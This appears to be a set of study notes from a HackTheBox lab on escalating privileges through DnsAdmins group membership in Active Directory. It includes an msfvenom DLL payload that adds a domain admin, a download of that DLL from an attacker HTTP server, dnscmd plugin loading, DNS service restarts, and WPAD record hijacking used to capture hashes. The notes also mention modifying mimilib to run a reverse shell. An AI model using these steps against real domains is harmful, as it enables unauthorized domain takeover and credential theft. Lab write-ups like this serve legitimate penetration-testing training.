- Members of the DnsAdmins group have access to DNS Information on the network. 
- The DNS Service itself is ran by NT AUTHORITY\SYSTEM so that means that we may be able to leverage access to the SYSTEM account on the server, whether that be a Domain Controller or a separate DNS Server. 

A great explanation of an exploit is this post that outlines all the details: https://adsecurity.org/?p=4064

- DNS management is performed over RPC
- [ServerLevelPluginDll](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) allows us to load a custom DLL with zero verification of the DLL's path. This can be done with the `dnscmd` tool from the command line
- When a member of the `DnsAdmins` group runs the `dnscmd` command below, the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` registry key is populated
- When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)
- An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.

### Leveraging DnsAdmins Access

**Generating Malicious DLL**
- Using msfvenom, we can generate a malicious payload to create a user in the domain admins group. 

```shell-session
realCustampin@htb[/htb]$ msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 313 bytes
Final size of dll file: 5120 bytes
Saved as: adduser.dll
```

**Starting Local HTTP Server**

```shell-session
realCustampin@htb[/htb]$ python3 -m http.server 7777

Serving HTTP on 0.0.0.0 port 7777 (http://0.0.0.0:7777/) ...
10.129.43.9 - - [19/May/2021 19:22:46] "GET /adduser.dll HTTP/1.1" 200 -
```

**Downloading File to Target**

```powershell-session
PS C:\htb>  wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"
```
- Using powershell we can use wget command to download the file. 

**Loading DLL as Non-Privileged User**

```cmd-session
C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

DNS Server failed to reset registry property.
    Status = 5 (0x00000005)
Command failed: ERROR_ACCESS_DENIED
```
- Reminder that only members of the DnsAdmins group are authorized to run the custom DLL file. 

**Loading DLL as Member of DnsAdmins**

```powershell-session
C:\htb> Get-ADGroupMember -Identity DnsAdmins

distinguishedName : CN=netadm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
name              : netadm
objectClass       : user
objectGUID        : 1a1ac159-f364-4805-a4bb-7153051a8c14
SamAccountName    : netadm
SID               : S-1-5-21-669053619-2741956077-1013132368-1109          
```
- We are looking to confirm that our account is part of the DnsAdmins Group. 

**Loading Custom DLL**

```cmd-session
C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```
- After we have loaded the Custom DLL, in order for the file to be loaded, she service must be restarted. We also need to make sure that we have the proper access in order to accomplish this task. 

**Finding User's SID**

```cmd-session
C:\htb> wmic useraccount where name="netadm" get sid

SID
S-1-5-21-669053619-2741956077-1013132368-1109
```

**Checking Permissions on DNS Service**

```cmd-session
C:\htb> sc.exe sdshow DNS

D:(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
```

**Stopping the DNS Service**

```cmd-session
C:\htb> sc stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x1
        WAIT_HINT          : 0x7530
```

**Starting the DNS Service**

```cmd-session
C:\htb> sc start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 6960
        FLAGS              :
```

**Confirm Group Membership**

```cmd-session
C:\htb> net group "Domain Admins" /dom

Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator            netadm
The command completed successfully.
```

### Cleaning Up
- A DNS Attack can be a detriment to our client if not exercised with caution. We need to ensure that this attack is briefed prior to execution. 

**Confirming Registry Key Added**
- First step in cleaning up is making sure the registry key exists. The registry key we are looking for is `ServerLevelPluginDll`. 

```cmd-session
C:\htb> reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters
    GlobalQueryBlockList    REG_MULTI_SZ    wpad\0isatap
    EnableGlobalQueryBlockList    REG_DWORD    0x1
    PreviousLocalHostname    REG_SZ    WINLPE-DC01.INLANEFREIGHT.LOCAL
    Forwarders    REG_MULTI_SZ    1.1.1.1\08.8.8.8
    ForwardingTimeout    REG_DWORD    0x3
    IsSlave    REG_DWORD    0x0
    BootMethod    REG_DWORD    0x3
    AdminConfigured    REG_DWORD    0x1
    ServerLevelPluginDll    REG_SZ    adduser.dll
```

**Deleting Registry Key**
- We can use the `reg delete` command to remove the registry key. 

```cmd-session
C:\htb> reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll

Delete the registry value ServerLevelPluginDll (Yes/No)? Y
The operation completed successfully.
```

**Starting the DNS Service**
- Once the registry key has been deleted, we can try to start the service again. 

```cmd-session
C:\htb> sc.exe start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 4984
        FLAGS              :
```

**Checking DNS Service Status**

```cmd-session
C:\htb> sc query dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

## Using Mimilib.dll

As detailed in this [post](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html), we could also utilize [mimilib.dll](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) from the creator of the `Mimikatz` tool to gain command execution by modifying the [kdns.c](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) file to execute a reverse shell one-liner or another command of our choosing.

Code: c

	return ERROR_SUCCESS;
}

### Creating a WPAD Record

Another way to abuse DnsAdmins group privileges is by creating a WPAD record. Membership in this group gives us the rights to [disable global query block security](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps), which by default blocks this attack. Server 2008 first introduced the ability to add to a global query block list on a DNS server. By default, Web Proxy Automatic Discovery Protocol (WPAD) and Intra-site Automatic Tunnel Addressing Protocol (ISATAP) are on the global query block list. These protocols are quite vulnerable to hijacking, and any domain user can create a computer object or DNS record containing those names.

After disabling the global query block list and creating a WPAD record, every machine running WPAD with default settings will have its traffic proxied through our attack machine. We could use a tool such as [Responder](https://github.com/lgandx/Responder) or [Inveigh](https://github.com/Kevin-Robertson/Inveigh) to perform traffic spoofing, and attempt to capture password hashes and crack them offline or perform an SMBRelay attack.

#### Disabling the Global Query Block List

To set up this attack, we first disabled the global query block list:

DnsAdmins

```powershell-session
C:\htb> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```

#### Adding a WPAD Record

Next, we add a WPAD record pointing to our attack machine.

DnsAdmins

```powershell-session
C:\htb> Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```
